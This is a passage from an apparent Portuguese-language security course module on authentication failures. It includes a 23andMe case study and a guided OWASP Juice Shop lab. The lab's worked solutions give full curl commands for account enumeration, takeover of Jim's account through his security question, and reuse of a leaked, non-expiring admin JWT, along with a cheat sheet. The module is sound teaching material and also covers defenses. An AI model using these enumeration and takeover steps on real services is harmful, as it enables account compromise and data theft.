+<GlossaryTerm term="credential stuffing">credential stuffing</GlossaryTerm>:
+cerca de **14 mil contas** (0,1% dos usuários) foram acessadas diretamente, com
+e-mails e senhas que os clientes tinham **reusado** de outros sites já vazados.
+Nenhum sistema da 23andMe foi "quebrado": as senhas estavam certas.
+
+O estrago, porém, não parou nas 14 mil contas. Pelo recurso **DNA Relatives**,
+que liga parentes genéticos, o atacante pivotou dessas contas para os dados de
+**6,9 milhões** de pessoas — cerca de metade da base da empresa.
+
+- **Impacto:** dados de 6,9 milhões de pessoas (5,5 milhões via DNA Relatives e
+  1,4 milhão via perfis de árvore genealógica), incluindo nome, ano de
+  nascimento, rótulos de parentesco, percentual de DNA compartilhado com
+  parentes, relatórios de ancestralidade e localização autodeclarada. Processos
+  e multas se seguiram.
+- **Lição:** contra credential stuffing, validar a senha não basta — a senha é
+  verdadeira. A defesa de raiz é **MFA** (um segundo fator que o atacante não
+  tem) somada a rate limiting e à checagem de senhas contra listas de
+  vazamentos. E um único recurso mal pensado (o DNA Relatives) transformou 14 mil
+  contas em 6,9 milhões de vítimas.
+- **Fonte:** [23andMe confirms hackers stole ancestry data on 6.9 million users — TechCrunch](https://techcrunch.com/2023/12/04/23andme-confirms-hackers-stole-ancestry-data-on-6-9-million-users/)
+  (citando o comunicado oficial da 23andMe).
+
+## 5. Mãos à obra — o laboratório guiado
+
+**Objetivo:** ao terminar, você terá (1) enumerado quais contas existem no Juice
+Shop abusando do endpoint de recuperação, (2) tomado a conta do usuário Jim
+trocando a senha dele sem saber a antiga, e (3) provado que o token de sessão do
+admin não expira, carrega o hash da senha e sobrevive ao logout. Cada missão
+rende uma flag.
+
+O laboratório é o **`juice-shop`**: o Kali e o OWASP Juice Shop, uma loja de
+sucos deliberadamente vulnerável mantida pela OWASP, na mesma rede interna. De
+dentro do Kali, o alvo responde em `http://juice-shop:3000/`. Você trabalha pelo
+terminal do Kali, com `curl` e `python3` — o que a attack box já traz.
+
+<Callout variant="warning" title="Um laboratório por vez">
+Este lab sobe o Kali e o Juice Shop. Se outro lab estiver no ar, o botão vira
+**Trocar para este lab**. Feche o que não estiver usando antes de subir.
+</Callout>
+
+### 5.1 Subir o lab e preparar a bancada (passo a passo)
+
+1. No painel **Laboratório**, no topo desta página, clique em **Iniciar**. Se a
+   plataforma avisar que faltam imagens, rode no terminal do WSL
+   `scripts/lab.sh pull juice-shop` (único momento com internet) e tente de
+   novo. Pela linha de comando, a alternativa para ligar é
+   `scripts/lab.sh up juice-shop`.
+2. Quando o desktop do Kali aparecer, clique nele, abra um terminal e crie a
+   pasta de evidências:
+
+```console
+$ umask 077
+$ mkdir -p ~/engajamentos/lab-4.4_juice-shop/evidencias
+$ cd ~/engajamentos/lab-4.4_juice-shop/evidencias
+```
+
+3. Confirme que o alvo responde:
+
+```console
+$ curl -s http://juice-shop:3000/rest/admin/application-version
+{"version":"20.2.0"}
+```
+
+### 5.2 A carta de autorização do exercício
+
+<Callout variant="info" title="Autorização — exercício 4.4 (laboratório local)">
+**Ativo autorizado:** a aplicação `http://juice-shop:3000/` do lab `juice-shop`.
+
+**Técnicas autorizadas:** enumeração de contas pelo endpoint de recuperação,
+reset de senha por pergunta de segurança e análise/reuso do token de sessão,
+tudo contra o Juice Shop, pelo terminal do Kali.
+
+**Fora do escopo:** qualquer outro host (o `guacd`, o próprio Kali) e qualquer
+sistema fora do laboratório. Nada de testar estas técnicas em sites reais.
+</Callout>
+
+### 5.3 Missão 1 — Enumeração de contas (guiada → desafio)
+
+**Cenário:** você recebeu uma lista de oito e-mails de um cliente e precisa saber
+quais são contas de verdade no Juice Shop — o primeiro passo de um ataque
+direcionado. A lista:
+
+```text
+jim@juice-sh.op
+bender@juice-sh.op
+ciso@juice-sh.op
+mc.safesearch@juice-sh.op
+morty@juice-sh.op
+alice@juice-sh.op
+carlos@juice-sh.op
+eve@juice-sh.op
+```
+
+**Seu objetivo:** descobrir **quantas** dessas contas existem e qual é o **id da
+pergunta de segurança** da conta `mc.safesearch@juice-sh.op`. A flag é
+`FLAG{quantidade-id}`.
+
+O caminho você já viu na seção 3.1: o endpoint
+`/rest/user/security-question?email=...` devolve a pergunta (com um campo `id`)
+para quem existe e `{}` para quem não existe. Primeiro, faça uma consulta à mão
+para ver o formato; depois, automatize a lista inteira.
+
+```console
+$ curl -s "http://juice-shop:3000/rest/user/security-question?email=jim@juice-sh.op"
+{"question":{"id":1,"question":"Your eldest siblings middle name?",...}}
+```
+
+<Hint title="Dica 1 — varrer a lista">
+Ponha os oito e-mails num laço de shell e chame o endpoint para cada um,
+imprimindo o e-mail ao lado da resposta. As linhas que terminam em `{}` são as
+contas que não existem. Um `for e in ...; do curl ...; done` resolve.
+</Hint>
+
+<Hint title="Dica 2 — ler o id certo">
+Para a segunda metade, olhe **só** a resposta de `mc.safesearch@juice-sh.op`: o
+campo `question.id` é o número que entra na flag. Não confunda com o `id` de
+outra conta.
+</Hint>
+
+<Solution title="Solução da Missão 1">
+Saída real do lab:
+
+```console
+$ for e in jim bender ciso mc.safesearch morty alice carlos eve; do
+    q=$(curl -s "http://juice-shop:3000/rest/user/security-question?email=${e}@juice-sh.op")
+    printf '%-16s -> %s\n' "$e" "$q"
+  done
+jim              -> {"question":{"id":1,"question":"Your eldest siblings middle name?",...}}
+bender           -> {"question":{"id":10,"question":"Company you first work for as an adult?",...}}
+ciso             -> {"question":{"id":7,"question":"Name of your favorite pet?",...}}
+mc.safesearch    -> {"question":{"id":8,"question":"Last name of dentist when you were a teenager? (Do not include 'Dr.')",...}}
+morty            -> {"question":{"id":7,"question":"Name of your favorite pet?",...}}
+alice            -> {}
+carlos           -> {}
+eve              -> {}
+```
+
+Cinco contas existem (jim, bender, ciso, mc.safesearch, morty); três não
+(alice, carlos, eve). A pergunta de `mc.safesearch` tem `id` **8**. A flag é
+`FLAG{5-8}`.
+</Solution>
+
+<FlagInput task="missao-1-enumeracao" />
+
+### 5.4 Missão 2 — Tomar a conta do Jim (desafio central)
+
+**Cenário:** entre as contas que você enumerou está `jim@juice-sh.op`. Você vai
+assumi-la trocando a senha dele **sem saber a senha atual** — abusando da
+recuperação por pergunta de segurança.
+
+**Seu objetivo:** resetar a senha do Jim e confirmar na lista de desafios do
+Juice Shop que o desafio correspondente ficou resolvido. A flag é
+`FLAG{key-resposta}`, onde `key` é a chave do desafio que você resolveu e
+`resposta` é o texto que você usou como resposta da pergunta de segurança.
+
+A pergunta do Jim (você viu na Missão 1) é "Your eldest siblings middle name?"
+— o nome do meio do irmão mais velho. Não dá para adivinhar; **tem de ser
+descoberto**. O Juice Shop deixa o rastro nas resenhas de produto que o Jim
+escreveu. Investigue-as.
+
+<Hint title="Dica 1 — achar as pistas do Jim">
+As resenhas de um produto ficam em `/rest/products/<id>/reviews`. Procure
+resenhas cujo `author` seja `jim@juice-sh.op`. Elas citam um universo de ficção
+científica bem conhecido. Vale varrer os produtos (os ids vão de 1 a ~46) e
+filtrar pelo autor.
+</Hint>
+
+<Hint title="Dica 2 — da pista ao nome">
+As resenhas falam de "Starfleet symbol", "replicator" e "Bones' new tricorder": é **Star
+Trek**. O "Jim" da série é o capitão James T. Kirk. Pesquise o nome do **irmão
+mais velho** dele e pegue o **nome do meio**. (Ele é chamado de "Sam" na série.)
+</Hint>
+
+<Hint title="Dica 3 — enviar o reset">
+O reset é um POST para `/rest/user/reset-password` com um JSON
+`{"email":..., "answer":..., "new":..., "repeat":...}`. O `new` e o `repeat`
+são a senha nova (você escolhe). Se a resposta vier com o objeto do usuário, deu
+certo. Depois, confira em `/api/Challenges` qual desafio ficou `solved: true` e
+pegue o campo `key` dele.
+</Hint>
+
+<Solution title="Solução da Missão 2">
+Saída real do lab. A resposta é **Samuel** (George Samuel Kirk, o irmão mais
+velho de James T. Kirk):
+
+```console
+$ curl -s -X POST http://juice-shop:3000/rest/user/reset-password \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"jim@juice-sh.op","answer":"Samuel","new":"NovaSenha123!","repeat":"NovaSenha123!"}'
+{"user":{"id":2,"email":"jim@juice-sh.op",...}}
+```
+
+Confirme que a senha nova funciona e qual desafio ficou resolvido:
+
+```console
+$ curl -s -X POST http://juice-shop:3000/rest/user/login \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"jim@juice-sh.op","password":"NovaSenha123!"}' \
+    | python3 -c "import sys,json;print('login OK, id', json.load(sys.stdin)['authentication']['bid'])"
+login OK, id 2
+$ curl -s "http://juice-shop:3000/api/Challenges/?name=Reset%20Jim%27s%20Password" \
+    | python3 -c "import sys,json;c=json.load(sys.stdin)['data'][0];print(c['key'], 'solved=', c['solved'])"
+resetPasswordJimChallenge solved= True
+```
+
+A `key` é `resetPasswordJimChallenge` e a resposta foi `Samuel`. A flag é
+`FLAG{resetPasswordJimChallenge-Samuel}`.
+</Solution>
+
+<FlagInput task="missao-2-reset-jim" />
+
+### 5.5 Missão 3 — A sessão que não morre (desafio)
+
+**Cenário:** você quer provar para o cliente que, mesmo que o atacante não
+descubra nenhuma senha, o **token de sessão** do Juice Shop é um passe perigoso:
+não expira, carrega dados sensíveis e o logout não o cancela.
+
+**Seu objetivo:** fazer login como admin (`admin@juice-sh.op` / `admin123` — uma
+senha fraca e documentada; tratamos como dada aqui), capturar o token e
+decodificá-lo para achar **dois** defeitos. A flag é `FLAG{marcador-hash}`, onde
+`marcador` é a palavra que descreve a falta de prazo do token e `hash` é o valor
+do campo `password` que vaza dentro do payload.
+
+<Hint title="Dica 1 — capturar e decodificar">
+O token vem em `authentication.token` na resposta do login. Um JWT tem três
+partes separadas por ponto; o payload é a **segunda**. Decodifique-a de
+Base64url (`cut -d. -f2` e um `base64 -d`, ou `python3`). Leia o JSON que sair.
+</Hint>
+
+<Hint title="Dica 2 — os dois defeitos">
+No payload decodificado, procure: (1) um campo de tempo que **deveria** limitar
+a validade e **não está lá** — compare com o `iat` que está; a palavra que
+descreve essa ausência é o `marcador` da flag (dica: "sem prazo" em inglês,
+junto, minúsculas, como em "no-exp" sem o traço). (2) Um campo `password` que
+**não deveria** estar num token entregue ao cliente — o valor dele é o `hash`.
+Para fechar a prova, reenvie o token a `/rest/basket/1` e veja que responde 200
+mesmo "após o logout".
+</Hint>
+
+<Solution title="Solução da Missão 3">
+Saída real do lab:
+
+```console
+$ TOKEN=$(curl -s -X POST http://juice-shop:3000/rest/user/login \
+    -H 'Content-Type: application/json' \
+    -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
+    | python3 -c "import sys,json;print(json.load(sys.stdin)['authentication']['token'])")
+$ echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null; echo
+{"data":{"id":1,"username":"","email":"admin@juice-sh.op","password":"0192023a7bbd73250516f069df18b500","role":"admin",...},"iat":1791296926}
+```
+
+O payload tem `iat` mas **não tem `exp`**: o token não expira (o `marcador` é
+`noexp`). E traz `"password":"0192023a7bbd73250516f069df18b500"` — o hash MD5 da
+senha do admin, dentro do token. A prova de que o logout não invalida:
+
+```console
+$ curl -s -o /dev/null -w "basket reusado status=%{http_code}\n" \
+    http://juice-shop:3000/rest/basket/1 -H "Authorization: Bearer $TOKEN"
+basket reusado status=200
+```
+
+O token, "após o logout", ainda abre a cesta do admin. A flag é
+`FLAG{noexp-0192023a7bbd73250516f069df18b500}`.
+</Solution>
+
+<FlagInput task="missao-3-sessao-eterna" />
+
+### 5.6 Walkthrough: as três falhas vistas pelo defensor (sem flag)
+
+- **Missão 1** morre padronizando as respostas: o endpoint de recuperação devia
+  responder igual (mesmo corpo, mesmo tempo) para conta existente e inexistente,
+  negando o oráculo.
+- **Missão 2** morre jogando a pergunta de segurança no lixo: recuperação por
+  token aleatório de uso único, enviado ao e-mail da vítima e com prazo curto.
+- **Missão 3** morre dando prazo e dono à sessão: um `exp` curto no token, uma
+  lista de revogação (ou sessões no servidor) para o logout cancelar de verdade,
+  e **nunca** colocar o hash da senha dentro do token.
+
+A seção 8 detalha cada uma com código.
+
+### 5.7 Desligar o laboratório
+
+No painel do lab, clique em **Parar** (libera a vaga de um lab por vez). Para
+refazer as missões do zero (a senha do Jim volta ao original e os desafios
+voltam a "não resolvidos"), use **Resetar**, que recria o contêiner do Juice
+Shop — cujo estado é todo em memória.
+
+## 6. Variações e aprofundamento
+
+**Outras recuperações de senha quebradas.** A pergunta de segurança é só um dos
+jeitos de errar o "esqueci minha senha". Outros clássicos: **token de reset
+previsível** (sequencial ou baseado no tempo, que o atacante adivinha); **token
+que não expira ou é reutilizável**; **host header injection** no link de reset
+(você viu o Host header no 4.1), em que o atacante envolve o link num domínio
+que ele controla; e devolver a senha atual por e-mail (sinal de que ela foi
+guardada em claro ou de forma reversível).
+
+**MFA não é à prova de tudo.** Ter <GlossaryTerm term="multi-factor authentication">MFA</GlossaryTerm>
+não encerra o assunto. Há **MFA fatigue** (disparar dezenas de pushes até a
+vítima aprovar por cansaço), **SIM swapping** (portar o número da vítima para
+receber o SMS — por isso <GlossaryTerm term="TOTP">TOTP</GlossaryTerm> e chaves
+são melhores que SMS), **phishing de código em tempo real** e **fallback fraco**
+(se o "perdi meu segundo fator" cai numa pergunta de segurança, você voltou à
+estaca zero). O Juice Shop tem até um desafio de burlar o 2FACTOR via o campo
+`totpSecret` que, como você viu, vaza no token.
+
+**JWT e sessão em cenários modernos.** O par **access token** curto +
+**refresh token** longo tenta equilibrar conforto e segurança: o access expira
+em minutos, o refresh (guardado com mais cuidado) obtém um novo. Mas **logout
+real** continua exigindo revogar o refresh no servidor — de novo, não existe
+sessão sem estado em algum lugar. Em OAuth/OpenID Connect o mesmo problema
+reaparece em escala: quem revoga o quê, e quando.
+
+**Timing como oráculo.** Mesmo com mensagens idênticas, o **tempo** de resposta
+pode enumerar: se o servidor só calcula o hash da senha quando o usuário existe,
+a conta válida responde mais devagar. Defender enumeração, portanto, inclui
+igualar o tempo (calcular um hash "de mentira" mesmo para usuário inexistente).
+
+## 7. Erros comuns
+
+- **"A lista de desafios não mostra `solved: true`":** você resetou a senha mas
+  olhou o desafio errado. Filtre por `name=Reset Jim's Password` (ou procure a
+  `key` `resetPasswordJimChallenge`). Se o reset falhou, a resposta do POST traz
+  um erro em vez do objeto do usuário — confira a grafia de `Samuel`
+  (maiúscula inicial) e os campos `new`/`repeat` iguais.
+- **"O `base64 -d` do token reclama ou corta":** o payload de um JWT é
+  **Base64url** sem padding; às vezes falta o `=` do fim. Se o `base64 -d`
+  falhar, use o `python3` com `base64.urlsafe_b64decode`, completando o padding
+  (o `2>/dev/null` no exemplo esconde o aviso, mas o JSON sai inteiro).
+- **"Enumero e tudo volta `{}`":** você provavelmente mandou o e-mail sem
+  codificar, ou com espaço. Confira a URL e use aspas em volta dela no `curl`.
+  Lembre que o endpoint é o de **pergunta de segurança**, não o de login.
+- **"Reusei o token e veio 401":** confira o cabeçalho — é
+  `Authorization: Bearer <token>`, com o espaço depois de `Bearer`. Um token de
+  outra sessão (de um reset ou reset do lab) também já pode ter sido descartado;
+  pegue um token novo com um login.
+- **"Resetei o lab e o Jim voltou":** é o esperado. O estado do Juice Shop é
+  todo em memória; **Resetar** devolve tudo de fábrica, inclusive a senha do Jim
+  e os desafios.
+
+## 8. Defesa e mitigação
+
+A regra que amarra tudo: **o servidor decide, e o servidor lembra**. Credenciais
+e sessão não podem depender de o cliente se comportar.
+
+### 8.1 Senhas e login
+
+- **Guarde senhas só como hash forte e com salt.** Use um algoritmo lento feito
+  para senhas — <GlossaryTerm term="bcrypt">bcrypt</GlossaryTerm>, scrypt ou
+  Argon2 —, nunca MD5 ou SHA-256 puro. O Juice Shop usa MD5 de propósito, para
+  você ver o erro.
+
+```javascript
+// ERRADO: hash rápido, sem salt — quebrável em massa (o Juice Shop faz isto)
+const hash = md5(password);
+
+// CERTO: hash lento e salgado, feito para senhas
+const hash = await bcrypt.hash(password, 12); // 12 = fator de custo
+const ok   = await bcrypt.compare(password, hash);
+```
+
+- **Mensagens genéricas.** O login responde a mesma coisa para "usuário não
+  existe" e "senha errada" — mesmo texto, mesmo código, e tempo parecido (calcule
+  um hash mesmo quando o usuário não existe, para não vazar pelo tempo). Isso
+  fecha a <GlossaryTerm term="account enumeration">account enumeration</GlossaryTerm>,
+  e vale para **todos** os fluxos (login, cadastro, recuperação) — foi
+  justamente a recuperação que vazou na Missão 1.
+- **Rate limiting e bloqueio.** Imponha <GlossaryTerm term="rate limiting">rate
+  limiting</GlossaryTerm> por conta e por IP e um <GlossaryTerm term="account lockout">bloqueio</GlossaryTerm>
+  progressivo após erros, com cuidado para não virar um DoS do usuário legítimo
+  (prefira atraso crescente e CAPTCHA a um bloqueio duro e longo). Isso mata o
+  brute force, mas **não** o credential stuffing — para esse, veja o MFA.
+- **MFA.** Exija <GlossaryTerm term="multi-factor authentication">MFA</GlossaryTerm>,
+  de preferência <GlossaryTerm term="TOTP">TOTP</GlossaryTerm> ou chave FIDO2 (não
+  SMS). É a única defesa que ataca a raiz do credential stuffing: a senha
+  vazada, ainda que certa, não basta. Some a checagem da senha nova contra
+  corpora de senhas vazadas (a API "Have I Been Pwned", por exemplo).
+
+### 8.2 Recuperação de credencial
+
+Jogue fora a pergunta de segurança como **prova única**. O fluxo correto:
+
+1. o usuário pede o reset informando o e-mail;
+2. o servidor gera um **token aleatório** (forte, de um
+   <GlossaryTerm term="CSPRNG">CSPRNG</GlossaryTerm>), guarda o **hash** dele com
+   um prazo curto (ex.: 15 min) e manda o token só para o **e-mail da vítima**;
+3. o link com o token troca a senha; depois, o token é **invalidado** (uso
+   único) e as sessões ativas daquela conta são encerradas.
+
+Repare que o segredo vai a um canal que só o dono controla (o e-mail) e morre
+rápido. A resposta da etapa 1 é sempre a mesma ("se o e-mail existir, enviamos um
+link"), para não enumerar. Se usar pergunta de segurança, que seja como **2º
+fator** do reset, nunca sozinha.
+
+### 8.3 Sessão
+
+- **Dê prazo ao token.** Um JWT **precisa** de `exp` curto (minutos a poucas
+  horas). O Juice Shop não tem — por isso a Missão 3 funcionou.
+
+```javascript
+// ERRADO: sem exp e com dados sensíveis (o Juice Shop faz isto)
+jwt.sign({ data: user }, key);            // user inclui o hash da senha!
+
+// CERTO: só o necessário, com prazo curto
+jwt.sign({ sub: user.id, role: user.role }, key, { expiresIn: '15m' });
+```
+
+- **Carregue o mínimo no token.** Só um id e o papel. **Nunca** o hash da senha,
+  o `totpSecret` ou outro segredo: o payload é legível por qualquer um que tenha
+  o token.
+- **Logout que invalida de verdade.** Como o JWT é autocontido, "sair" no cliente
+  não basta. Mantenha uma **lista de revogação** (denylist de tokens/jti até
+  expirarem) ou volte a uma <GlossaryTerm term="server-side session">server-side
+  session</GlossaryTerm> que o logout apaga. Em access+refresh, revogue o refresh.
+- **Proteja o identificador.** Prefira guardar a sessão em um cookie
+  <GlossaryTerm term="HttpOnly">HttpOnly</GlossaryTerm> (invisível ao
+  JavaScript, logo a um XSS — ao contrário do `localStorage`),
+  <GlossaryTerm term="Secure (cookie)">Secure</GlossaryTerm> (só por HTTPS) e com
+  <GlossaryTerm term="SameSite">SameSite</GlossaryTerm>. Isso corta o
+  <GlossaryTerm term="session hijacking">session hijacking</GlossaryTerm> por
+  roubo de token.
+- **Rotacione o id no login.** Emita um identificador de sessão **novo** no
+  momento da autenticação e descarte o anterior. É a defesa, em uma linha, contra
+  <GlossaryTerm term="session fixation">session fixation</GlossaryTerm>.
+
+## 9. Exercícios
+
+Responda ao quiz de teoria e faça os desafios práticos. As três flags do módulo
+são as das missões da seção 5 (enumeração, reset do Jim e a sessão eterna).
+
+<Quiz task="quiz-final" />
+
+### Desafios práticos (sem flag)
+
+<Hint title="Desafio A — enumerar sem o endpoint de pergunta">
+O cadastro também pode enumerar. Tente registrar uma conta com um e-mail que já
+existe (`POST /api/Users`) e observe a resposta. Ela denuncia que o e-mail já
+está em uso? Compare com um e-mail novo. Que mensagem o servidor **deveria** dar
+para não vazar a existência da conta?
+</Hint>
+
+<Hint title="Desafio B — o tempo como oráculo">
+Meça o tempo de resposta do login (`curl -w "%{time_total}"`) para um usuário que
+existe com senha errada e para um que não existe. Rode cada um várias vezes. Há
+diferença consistente? Explique como isso poderia enumerar contas mesmo com
+mensagens idênticas, e o que a defesa (calcular um hash sempre) resolve.
+</Hint>
+
+<Hint title="Desafio C — desenhar o reset certo">
+Sem código: escreva os passos de um "esqueci minha senha" seguro para o Juice
+Shop, do pedido ao login com a senha nova, citando onde entram o token aleatório,
+o prazo, o uso único e a invalidação das sessões ativas. Compare com o que o
+Juice Shop faz hoje.
+</Hint>
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- **Autenticação** prova quem você é; **autorização** decide o que você pode;
+  **sessão** é a memória entre as duas, necessária porque o HTTP é sem estado.
+- **Account enumeration** vive em qualquer endpoint que reaja diferente para
+  conta existente e inexistente — no Juice Shop, o de pergunta de segurança.
+- **Brute force** (muitas senhas numa conta), **credential stuffing** (senhas
+  reais reusadas) e **password spraying** (uma senha em muitas contas) pedem
+  defesas diferentes; só o **MFA** ataca a raiz do stuffing.
+- **Perguntas de segurança** são uma segunda senha fraca e pesquisável: recuperar
+  senha assim é a falha da Missão 2 e do caso Palin.
+- Um **JWT** sem `exp`, carregando o hash da senha e guardado no `localStorage`,
+  é um passe vitalício que o **logout do cliente não cancela**: sem estado no
+  servidor, não há sessão para invalidar.
+- Defesa, em uma frase: **o servidor decide e o servidor lembra** — hash forte,
+  mensagens genéricas, rate limiting, MFA, reset por token de uso único, e
+  sessões com prazo e invalidação de verdade.
+
+### Cola rápida
+
+```text
+Enumerar conta     GET  /rest/user/security-question?email=ALVO   (pergunta = existe; {} = não)
+Resetar senha      POST /rest/user/reset-password  {email, answer, new, repeat}
+Ver desafio        GET  /api/Challenges/?name=Reset%20Jim%27s%20Password
+Capturar token     POST /rest/user/login  -> authentication.token
+Ler o payload      echo "$TOKEN" | cut -d. -f2 | base64 -d     (2ª parte, Base64url)
+Reusar o token     Authorization: Bearer <token>
+```
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [OWASP A07:2021 — Identification and Authentication Failures](https://owasp.org/Top10/2021/A07_2021-Identification_and_Authentication_Failures/)
+  — a descrição oficial da categoria, com os sintomas e as defesas.
+- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
+  — o guia prático de como fazer login, senha e mensagens de erro do jeito certo.
+- [OWASP Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
+  — prazo, invalidação, rotação e proteção do identificador de sessão.
+- [OWASP Forgot Password Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html)
+  — como desenhar uma recuperação de senha que não vire a porta dos fundos.
